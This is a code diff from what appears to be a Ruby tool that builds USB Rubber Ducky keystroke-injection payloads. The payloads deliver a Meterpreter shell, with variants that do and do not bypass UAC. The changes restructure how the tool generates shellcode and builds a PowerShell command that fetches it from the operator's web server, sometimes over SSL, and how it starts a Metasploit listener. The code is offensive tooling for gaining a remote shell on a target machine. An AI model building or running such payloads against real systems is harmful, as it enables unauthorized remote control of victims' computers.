@@ -96,11 +96,20 @@ def fast_meterpreter_setup
   web_port = @server_setup.get_port
   shellcode = generate_shellcode(msf_host,msf_port)
   @ssl ? powershell_command = powershell_fast_meterpreter("https://#{web_host}:#{web_port}") : powershell_command = powershell_fast_meterpreter("http://#{web_host}:#{web_port}")
-  return powershell_command,web_host,web_port,shellcode,msf_host,msf_port
+  return powershell_command,@web_host,@web_port,@shellcode,msf_host,msf_port
 end
 def start_msf(host,port)
   msf = Readline.readline("#{get_input('Would you like to start the Metasploit Listener[yes/no]')} ", true)
-  msf == 'yes' ? metasploit_setup(host,port) : print_info("Goody Bye!\n")
+  if not @ssl and msf == 'yes'
+    metasploit_setup(host,port)
+  elsif @ssl and msf == 'yes'
+    Thread.new { @server_setup.ruby_web_server(@web_port,@ssl,@web_host,@shellcode) }
+    metasploit_setup(host,port)
+  elsif @ssl and msf != 'yes'
+    @server_setup.ruby_web_server(@web_port,@ssl,@web_host,@shellcode)
+  else
+    print_info("Good Bye!\n")
+  end
 end
 def start_hash_server(port,host=nil)
   hash = Readline.readline("#{get_input('Would you like to start the listener[yes/no]')} ", true)
@@ -156,49 +165,42 @@ def case_fast_meterpreter_menu
   case fast_meterpreter_answer
     when '1'
       @ssl = true
-      powershell_command,web_host,web_port,shellcode,msf_host,msf_port = fast_meterpreter_setup
+      powershell_command,@web_host,@web_port,@shellcode,msf_host,msf_port = fast_meterpreter_setup
       print_info("Creating Text File!\n")
       ducky_fast_meterpreter_uac(powershell_command)
       compile_ducky(fast_meterpreter_file)
-      Thread.new { @server_setup.ruby_web_server(web_port,@ssl,web_host,shellcode) }
-      #ServerSetUp.new.ruby_web_server(web_port,@ssl,web_host,shellcode)
       start_msf(msf_host,msf_port)
     when '2'
       @ssl = true
-      powershell_command,web_host,web_port,shellcode,msf_host,msf_port = fast_meterpreter_setup
+      powershell_command,@web_host,@web_port,@shellcode,msf_host,msf_port = fast_meterpreter_setup
       print_info("Creating Text File!\n")
       ducky_fast_meterpreter_no_uac(powershell_command)
       compile_ducky(fast_meterpreter_file)
-      Thread.new { @server_setup.ruby_web_server(web_port,@ssl,web_host,shellcode) }
       start_msf(msf_host,msf_port)
     when '3'
       @ssl = true
-      powershell_command,web_host,web_port,shellcode,msf_host,msf_port = fast_meterpreter_setup
+      powershell_command,@web_host,@web_port,@shellcode,msf_host,msf_port = fast_meterpreter_setup
       print_info("Creating Text File!\n")
       ducky_fast_meterpreter_low(powershell_command)
       compile_ducky(fast_meterpreter_file)
-      Thread.new { @server_setup.ruby_web_server(web_port,@ssl,web_host,shellcode) }
       start_msf(msf_host,msf_port)
     when '4'
-      powershell_command,web_host,web_port,shellcode,msf_host,msf_port = fast_meterpreter_setup
+      powershell_command,@web_host,@web_port,@shellcode,msf_host,msf_port = fast_meterpreter_setup
       print_info("Creating Text File!\n")
       ducky_fast_meterpreter_uac(powershell_command)
       compile_ducky(fast_meterpreter_file)
-      Thread.new { @server_setup.ruby_web_server(web_port,nil,web_host,shellcode) }
       start_msf(msf_host,msf_port)
     when '5'
-      powershell_command,web_host,web_port,shellcode,msf_host,msf_port = fast_meterpreter_setup
+      powershell_command,@web_host,@web_port,@shellcode,msf_host,msf_port = fast_meterpreter_setup
       print_info("Creating Text File!\n")
       ducky_fast_meterpreter_uac(powershell_command)
       compile_ducky(fast_meterpreter_file)
-      Thread.new { @server_setup.ruby_web_server(web_port,nil,web_host,shellcode) }
       start_msf(msf_host,msf_port)
     when '6'
-      powershell_command,web_host,web_port,shellcode,msf_host,msf_port = fast_meterpreter_setup
+      powershell_command,@web_host,@web_port,@shellcode,msf_host,msf_port = fast_meterpreter_setup
       print_info("Creating Text File!\n")
       ducky_fast_meterpreter_uac(powershell_command)
       compile_ducky(fast_meterpreter_file)
-      Thread.new { @server_setup.ruby_web_server(web_port,nil,web_host,shellcode) }
       start_msf(msf_host,msf_port)
     when '99'
       case_main_menu
